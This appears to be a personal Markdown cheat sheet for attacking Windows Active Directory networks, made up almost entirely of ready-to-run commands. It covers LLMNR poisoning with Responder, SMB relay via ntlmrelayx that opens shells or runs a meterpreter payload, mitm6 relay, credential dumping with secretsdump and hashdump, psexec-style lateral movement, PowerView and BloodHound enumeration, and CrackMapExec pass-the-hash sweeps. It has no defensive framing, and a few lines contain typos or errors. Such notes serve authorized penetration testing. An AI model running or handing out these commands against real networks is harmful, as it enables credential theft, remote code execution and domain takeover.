



## LMNR Poisoning

Responder responder -I eth0 -rdwv

## SMB Relay
`nmap --script=smb2-security-mode.sse -p445`

### Attack 1
http off smb off in responder.conf
```bash
responder -I eth0 -rdwv
ntlmrelayx.py -tf targets.txt -smb2support
```

### Attack 2
http off smb off in responder.conf
```bash
responder -I eth0 -rdwv
ntlmrelayx.py -tf targets.txt -smb2support -i # It will show SMB shell opned on port {PORT}
nc 127.0.0.1 {PORT}
```
SHELL command `shares` to get shares name and `use SHARENAME$` to get access.

### Attack 3
http off smb off in responder.conf
```bash
responder -I eth0 -rdwv
ntlmrelayx.py -tf targets.txt -smb2support -e meterpreterShell.exe
```
### Attack 3
http off smb off in responder.conf
```bash
responder -I eth0 -rdwv
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```

## IPV6 mitm6 Attack

`ntlmrelayx.py -6 -t ldaps://192.168.111 -wh sub.domain.tld -l loots`


## Impacket

### secretdump
`secretsdump.py domain/user:password@192.168.0.101  #dump hash`

## Hashcrack
### NTLMHash
hashcrack 5600
### Samhash


# Attacks with Credential

### Metasploit PSEXEC

use exploit `exploit/windows/smb/psexec` on metasploit
or
`psexec.py domain.tld/username:password@192.168.0.111`
or
`smbexec.py domain.tld/username:password@192.168.0.111`
or
`wmiexec.py domain.tld/username:password@192.168.0.111`

Command to dump hash after shell in metasploit `hashdump`

# Attacks After Compromise

## PowerView

https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
```powershell
powershell -ep bypass 
..\PowerView.ps1
```
```Powershell
Get-NetDomain  # DC info
Get-NetDomainController # DC Info
Get-NetDomainPolicy  # Domain Policy
Get-NetDomainPolicy.{system access} # Specific Policy By Name
Get-NetUser # User Details
Get-UserProperty #user property names
Get-UserProperty -Properties propertyname #specific property
Get-NetComputer -FullData
Get-NetGroup # Get Group Names
Get-NetGroupMember -GroupName "Domain Admin" # Get Group Mamber Names of Specific Group
Invoke-ShareFinder # Share Details

```

## BloodHound

```bash
neo4j console #neo4j login
bloodhound #bloodhound start in new terminal tab
```

Sharphound Data Collection for bloodhound https://github.com/BloodHoundAD/SharpHound3
```Powershell
powershell -ep bypass 
..\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain domain.tld -ZipFileName output.zip
```
Upload Zip in BloodHound

Goto Queries and Select Queries

# Crackmapexec

URL: https://github.com/byt3bl33d3r/CrackMapExec

Cheetsheet: https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/

```bash
crackmapexec smb 10.10.3.0/24 -u username -H hashdumpedhashlastpart --local # Find login with hash
crackmapexec smb 10.10.3.0/24 -u username -D Domain.tld -p password # Find login with password
```


